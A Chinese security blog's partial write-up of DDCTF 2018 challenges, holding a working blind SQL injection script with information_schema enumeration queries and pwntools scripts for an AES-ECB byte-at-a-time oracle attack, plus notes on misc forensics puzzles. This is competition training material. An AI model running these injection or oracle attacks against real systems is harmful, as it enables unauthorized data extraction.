@@ -1,0 +1,1333 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="DDCTF的部分WriteUp, LANVNAL&#39;S Blog">
+    <meta name="description" content="WEB安全、渗透测试、代码审计、20届毕业本科生">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>DDCTF的部分WriteUp | LANVNAL&#39;S Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">LANVNAL&#39;S Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/CTF/" class="waves-effect waves-light">
+      
+      <i class="fas fa-flag" style="zoom: 0.6;"></i>
+      
+      <span>CTF</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/websec/" class="waves-effect waves-light">
+      
+      <i class="fab fa-internet-explorer" style="zoom: 0.6;"></i>
+      
+      <span>Web安全</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="waves-effect waves-light">
+      
+      <i class="fas fa-code" style="zoom: 0.6;"></i>
+      
+      <span>代码审计</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="waves-effect waves-light">
+      
+      <i class="fas fa-server" style="zoom: 0.6;"></i>
+      
+      <span>靶机</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/other/" class="waves-effect waves-light">
+      
+      <i class="fas fa-align-left" style="zoom: 0.6;"></i>
+      
+      <span>Others</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;"></i>
+      
+      <span>网站导航</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags">
+          
+          <i class="fas fa-tags" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Tags</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/about">
+          
+          <i class="fas fa-user-circle" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>About</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/friends">
+          
+          <i class="fas fa-address-book" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Friends</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories">
+          
+          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Categories</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/archives">
+          
+          <i class="fas fa-archive" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Archives</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">LANVNAL&#39;S Blog</div>
+        <div class="logo-desc">
+            
+            WEB安全、渗透测试、代码审计、20届毕业本科生
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/CTF/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-flag"></i>
+			
+			CTF
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/websec/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fab fa-internet-explorer"></i>
+			
+			Web安全
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-code"></i>
+			
+			代码审计
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/%E9%9D%B6%E6%9C%BA/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-server"></i>
+			
+			靶机
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/other/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-align-left"></i>
+			
+			Others
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			网站导航
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/tags " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-tags" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Tags</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/about " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-user-circle" style="position: absolute;left:50px" ></i>
+			      
+		          <span>About</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/friends " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-address-book" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Friends</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-bookmark" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Categories</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/archives " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-archive" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Archives</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/coverimgs/4.png')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">DDCTF的部分WriteUp</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/WriteUp/">
+                                <span class="chip bg-color">WriteUp</span>
+                            </a>
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2018-05-17
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2020-02-18
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.2k
+                </div>
+                
+
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <blockquote>
+<p>因为筹备校赛当时写了一半的wp拖了快一个月才写完，今天发现DDCTF的平台和题目竟然还开着(⊙v⊙)，很良心啊，当时也没有怎么去做题，水了几个misc，web涨姿势了，好菜_(:з」∠)_</p>
+</blockquote>
+<a id="more"></a>
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="数据库的秘密"><a href="#数据库的秘密" class="headerlink" title="数据库的秘密"></a>数据库的秘密</h2><p>先是XFF绕过，有三个搜索框，还有一个隐藏的author参数。注入点在author。</p>
+<p>有js进行签名和加时间戳，python可以调用execjs库执行js，就可以进行盲注啦。</p>
+<pre><code class="python">import requests
+import execjs
+import time
+
+flag = &#39;&#39;
+key=&quot;\141\144\162\145\146\153\146\167\145\157\144\146\163\144\160\151\162\165&quot;
+url=&quot;http://116.85.43.88:8080/ZODGIRYTDIETBCSI/dfe3ia/index.php?sig=&quot;
+chrs=&quot;DCTFABEGHIJKLMNOPQRSUVWXYZabcdefghijklmnopqrstuvwxyz\&#123;\&#125;!#$%&amp;&#39;()*+,-./0123456789:;&lt;=&gt;?@[\]^_`&quot;
+
+header=&#123;
+    &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/65.0.3325.181 Safari/537.36&quot;,
+    &quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;,
+    &quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9&quot;,
+    &quot;X-Forwarded-For&quot;: &quot;123.232.23.245&quot;,
+    &quot;Connection&quot;: &quot;close&quot;,
+    &quot;Content-Length&quot;:&quot;38&quot;,
+    &quot;Cache-Control&quot;: &quot;max-age=0&quot;,
+    &quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,
+    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;
+&#125;
+
+def load_jd():
+    file = open(&#39;change.js&#39;,&#39;r&#39;)
+    js = file.read()
+    return js
+
+def get_sig(sqlin,time1):
+    js = load_jd()
+    ctx = execjs.compile(js)
+    sig=ctx.call(&#39;submitt&#39;,sqlin,time1)
+    return sig
+
+def check(sqlin):
+    global header
+    time1 = str(int(time.time()))
+    new_url = url + get_sig(sqlin,time1) + &quot;&amp;time=&quot; + time1
+    post_data = &#123;
+        &#39;id&#39;:&#39;&#39;,
+        &#39;title&#39;:&#39;&#39;,
+        &#39;author&#39;:sqlin,
+        &#39;data&#39;:&#39;&#39;,
+        &#39;time&#39;:time1
+    &#125;
+    reqs = requests.post(url=new_url,data=post_data,headers=header)
+    data = reqs.content
+    if &quot;admin&quot; in data:
+        return 1
+    else:
+        return 0
+
+def main():
+    global flag
+    num = 1
+    while True:
+        for i in chrs:
+            sqlin = &quot;admin&#39; &amp;&amp; binary substr((SELECT secvalue from ctf_key4),1,&quot; + str(num) + &quot;)=&#39;&quot; + flag + i + &quot;&#39;# &quot;
+            if check(sqlin) == 1:
+                flag += i
+                num += 1
+                print flag
+                break
+        if flag[-1] == &#39;&#125;&#39;:
+            break
+
+if __name__ == &#39;__main__&#39;:
+    main()
+
+
+#SELECT group_concat(schema_name) from information_schema.schemata
+#SELECT group_concat(table_name) from information_schema.tables where table_schema=&#39;ddctf&#39;
+#SELECT group_concat(column_name) from information_schema.columns where table_schema=&#39;ddctf&#39; and table_name=&#39;ctf_key4&#39;secvalue
+#SELECT group_concat(column_name) from information_schema.columns where table_name=&#39;ctf_key4&#39;)
+#DDCTF&#123;MSBMCTFMXOCBYFYI&#125;</code></pre>
+<p>​    有大佬直接本地写个代理页面处理签名和时间戳上sqlmap一把梭，见下题引用链接..</p>
+<h2 id="专属链接"><a href="#专属链接" class="headerlink" title="专属链接"></a>专属链接</h2><p>html中发现文件读取，但是只能读<code>.class .xml .ico .ks</code>的文件，根据springmvc框架结构去找源码…做到这就晚上了，后来因为其他事就搁置了，太菜了啊ಥ_ಥ</p>
+<p>附上大佬的wp：</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/like98k/article/details/80057417" target="_blank" rel="noopener">https://blog.csdn.net/like98k/article/details/80057417</a></p>
+<p><a href="https://www.anquanke.com/post/id/144879" target="_blank" rel="noopener">https://www.anquanke.com/post/id/144879</a></p>
+</blockquote>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>真签到题</p>
+<h2 id="╯°□°）╯︵-┻━┻"><a href="#╯°□°）╯︵-┻━┻" class="headerlink" title="(╯°□°）╯︵ ┻━┻"></a>(╯°□°）╯︵ ┻━┻</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><blockquote>
+<p>(╯°□°）╯︵ ┻━┻<br>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd</p>
+</blockquote>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><pre><code class="python">s=&#39;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd&#39;
+flag=&#39;&#39;
+lens=len(s)
+for i in range(0,lens,2):
+    ch = &#39;0x&#39; + s[i:i+2]
+    data = int(ch,16)
+    flag += chr(data%128)
+
+print flag
+#That was fast! The flag is: DDCTF&#123;922ab9974a47cd322cf43b50610faea5&#125;</code></pre>
+<blockquote>
+<p>貌似是十六进制的凯撒位移？</p>
+</blockquote>
+<h2 id="第四扩展FS"><a href="#第四扩展FS" class="headerlink" title="第四扩展FS"></a>第四扩展FS</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><blockquote>
+<p>D公司正在调查一起内部数据泄露事件，锁定嫌疑人小明，取证人员从小明手机中获取了一张图片引起了怀疑。这是一道送分题，提示已经在题目里，日常违规审计中频次有时候非常重要。</p>
+</blockquote>
+<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>​    下载得到一个图片，图片属性得到提示<code>Pactera</code>，foremost分离出来一个压缩包，有密码，利用Pactera解压出来个file.txt，是一大段字符，词频分析得到flag。</p>
+<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><blockquote>
+<p>提示一：若感觉在中间某个容易出错的步骤，若有需要检验是否正确时，可以比较MD5: 90c490781f9c320cd1ba671fcb112d1c<br>提示二：注意补齐私钥格式<br>—–BEGIN RSA PRIVATE KEY—–<br>XXXXXXX<br>—–END RSA PRIVATE KEY—–</p>
+</blockquote>
+<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>提取出的zip都不能用，在smtp包中找到了图片的base64，去解码得到一张图片，就是私钥的内容，ocr识别出来可能会有几个错的，去人眼比对，简直丧心病狂。补全之后倒入私钥就能解ssl流量了，edit–&gt;preferences—&gt;ssl。追踪一下http流得到flag。</p>
+<h2 id="安全通信-AES-ECB加密攻击"><a href="#安全通信-AES-ECB加密攻击" class="headerlink" title="安全通信(AES-ECB加密攻击)"></a>安全通信(AES-ECB加密攻击)</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><blockquote>
+<p>请通过<code>nc 116.85.48.103 5002</code>答题，<code>mission key</code>是<code>f49348cf84d390da52498077ae7137d5</code>，<code>agent id</code>随意填就可以</p>
+</blockquote>
+<pre><code class="python">#!/usr/bin/env python
+import sys
+import json
+from Crypto.Cipher import AES
+from Crypto import Random
+
+
+def get_padding(rawstr):
+    remainder = len(rawstr) % 16
+    if remainder != 0:
+        return &#39;\x00&#39; * (16 - remainder)
+    return &#39;&#39;
+
+
+def aes_encrypt(key, plaintext):
+    plaintext += get_padding(plaintext)
+    aes = AES.new(key, AES.MODE_ECB)
+    cipher_text = aes.encrypt(plaintext).encode(&#39;hex&#39;)
+    return cipher_text
+
+
+def generate_hello(key, name, flag):
+    message = &quot;Connection for mission: &#123;&#125;, your mission&#39;s flag is: &#123;&#125;&quot;.format(name, flag)
+    return aes_encrypt(key, message)
+
+
+def get_input():
+    return raw_input()
+
+
+def print_output(message):
+    print(message)
+    sys.stdout.flush()
+
+
+def handle():
+    print_output(&quot;Please enter mission key:&quot;)
+    mission_key = get_input().rstrip()
+
+    print_output(&quot;Please enter your Agent ID to secure communications:&quot;)
+    agentid = get_input().rstrip()
+    rnd = Random.new()
+    session_key = rnd.read(16)
+
+    flag = &#39;&lt;secret&gt;&#39;
+    print_output(generate_hello(session_key, agentid, flag))
+    while True:
+        print_output(&quot;Please send some messages to be encrypted, &#39;quit&#39; to exit:&quot;)
+        msg = get_input().rstrip()
+        if msg == &#39;quit&#39;:
+            print_output(&quot;Bye!&quot;)
+            break
+        enc = aes_encrypt(session_key, msg)
+        print_output(enc)
+
+
+if __name__ == &quot;__main__&quot;:
+    handle()</code></pre>
+<h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>先来看一看题目流程：</p>
+<pre><code> ~ nc 116.85.48.103 5002
+[]Please enter mission key:
+f49348cf84d390da52498077ae7137d5
+[]Please enter your Agent ID to secure communications:
+00000
+[]de17b72ac25766900858e5ea3fbbb0b5bb25ca815cfebb19799cc9c3ae39e01181fe1be5cbf45a1868c8309223e47f522dd536f36ff756acae5175c824f79dcb383ddc2229cc2a03094387a253b0d8a791e25d01f1cd934d7c83e3a6b64787b1
+[]Please send some messages to be encrypted, &#39;quit&#39; to exit:
+00000
+88dfdc59a59ec6cfd9e5221b93bc6506
+[]Please send some messages to be encrypted, &#39;quit&#39; to exit:
+Connection for mission: 0000000
+de17b72ac25766900858e5ea3fbbb0b5f26fa7509409a427afa6a150bd4b01d3
+[]Please send some messages to be encrypted, &#39;quit&#39; to exit:
+quit
+Bye!</code></pre>
+<p>​    题目会给你一个mission key，输入此key，服务器返回一串密文，根据给出的题目脚本可知，密文的生成过程是：<code>Connection for mission: &#123;&#125;, your mission&#39;s flag is: &#123;&#125;</code>将第一个花括号替换成输入的agentid，第二个花括号就是我们想要的flag。</p>
+<p>​    下面我们来了解一下AES加密的ECB模式：</p>
+<blockquote>
+<p>ECB是最简单的块密码加密模式，加密前根据加密块大小（如AES为128位）分成若干块，之后将每块使用相同的密钥单独加密，解密同理.</p>
+<p><img src="/images/DDCTF/AES1.png" alt="AES"></p>
+<p><img src="/images/DDCTF/AES2.png" alt="AES"></p>
+</blockquote>
+<p>​    也就是从第一位开始每16位位一组，使用相同的密钥进行加密，最后一组如果不够16位，使用’\x00’填充够16位。</p>
+<p>​    原文开始的字符串是固定的：<code>Connection for mission:[空格]</code>，开头24位字符，如果我们补充8位，正好构成了两个块。第九位开始就是全新的一块，这一块就是我们利用的地方，我们可以通过输入16位的内容得到该内容的密文，如果两个密文块相同，那么原文也相同。我们采取从后向前的方式进行。</p>
+<p>​    因为最后一组如果不足16位以’\x00’填充，我们可以通过控制输入长度使最后的一个字符多出来单独作为一个分组，这样最后一组就是<code>&#125;</code>+15个’\x00’，先构造一个<code>&#125;</code>开头的完整的块，再往后面塞补位字符，直到密文最后一组和该组相同，我们就确定了这么一个数值，使分组后余一位的数值。获取该数字的脚本如下。</p>
+<pre><code class="python">from pwn import *
+import time
+import sys
+
+chrs=&quot;DCTFabcdefghijklmnopqrstuvwxyz\&#123;\&#125;!/0123456789:;&quot;
+key = &quot;f49348cf84d390da52498077ae7137d5&quot;
+flag = &#39;ab1af39995be81a&#39;
+
+def go():
+    global flag
+    for i in range(20):
+        conn = remote(&#39;116.85.48.103&#39;,5002)
+        conn.recvline()
+        conn.sendline(key)
+        conn.recvline()
+        ID = &quot;00000000&#125;&quot;
+        conn.sendline(ID)
+        rightstr = conn.recvline()
+        checkstr = rightstr[64:96]
+        compstr = rightstr[-33:-1]
+        print checkstr
+        print compstr
+        if checkstr == compstr:
+            print i 
+            conn.sendline(&#39;quit&#39;)
+            conn.close()
+            break
+        else:
+            conn.close()
+            ID += &quot;\x00&quot;
+        sys.stdout.flush()
+
+if __name__ == &#39;__main__&#39;:
+    go()
+
+# i=15
+</code></pre>
+<p>​    现在经过我们构造的原文大概这个样子-&gt; <code>Connection for m</code> <code>ission: 00000000</code> <code>&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</code> <code>, your mission&#39;s</code>  <code>[空格]flag is: DDCTF&#123;xxx</code> <code>&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</code> ,为了方便看我就直接分组表示了，每组16个字符。我们每向}前面插入一位，flag的倒数一位就会进入到最后的密文块，通过每一位的爆破可以得到flag的后15位（还有一个}），实际上我没发现flag大于15位，当我们继续插入一个字符时，}多出来了💺最后一组，倒数第二组的16个字符中后面15个是我们知道的，同理，我们只要比较倒数第二组密文和我们构造的密文（第三组）就好了。以此类推……</p>
+<p>​    脚本写复杂了，tryflag函数和第二次sendline没必要，懒得改了 _(:з」∠)_</p>
+<pre><code class="python">from pwn import *
+import time
+import sys
+
+chrs=&quot;DCTFabcdefghijklmnopqrstuvwxyz\&#123;\&#125;!/0123456789:;&quot;
+key = &quot;f49348cf84d390da52498077ae7137d5&quot;
+flag = &#39;ab1af39995be81a&#39;
+
+def tryflag(ID):
+    global flag
+    test = &quot;Connection for mission: &quot; + ID + &quot;, your mission&#39;s flag is&quot;
+    return test
+
+def go():
+    global flag
+
+    for i in chrs:
+        conn = remote(&#39;116.85.48.103&#39;,5002)
+        conn.recvline()
+        conn.sendline(key)
+        conn.recvline()
+        ID = &quot;00000000&quot;+i+flag+&quot;&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;
+        conn.sendline(ID)
+        rightstr = conn.recvline()
+        conn.recvline()
+        test = tryflag(ID)
+        conn.sendline(test)
+        checkstr = conn.recvline()[64:96]
+        if len(flag) &lt; 15:
+            compstr = rightstr[-33:-1]
+        elif len(flag) &gt;= 15 and len(flag) &lt; 31:
+            compstr = rightstr[-65:-33]
+        else:
+            compstr = rightstr[-97:-65]
+        print checkstr
+        print compstr
+        if checkstr == compstr:
+            flag = i + flag
+            print flag + &quot;------------------&quot;
+            conn.sendline(&#39;quit&#39;)
+            conn.close()
+            break
+        else:
+            conn.close()
+            #ID += &quot;\x00&quot;
+        sys.stdout.flush()
+
+if __name__ == &#39;__main__&#39;:
+    while True:
+        go()
+#DDCTF&#123;87fa2cd38a4259c29ab1af39995be81a&#125;
+</code></pre>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">LANVNAL</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lanvnal.com/2018/05/17/ddctf-de-bu-fen-writeup/">https://lanvnal.com/2018/05/17/ddctf-de-bu-fen-writeup/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">LANVNAL</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/WriteUp/">
+                                    <span class="chip bg-color">WriteUp</span>
+                                </a>
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,qq,wechat,weibo" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2018/07/28/rsa-ti-xing-zong-jie/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/coverimgs/2.jpg" class="responsive-img" alt="RSA题型总结（2018-8-5更新）">
+                        
+                        <span class="card-title">RSA题型总结（2018-8-5更新）</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
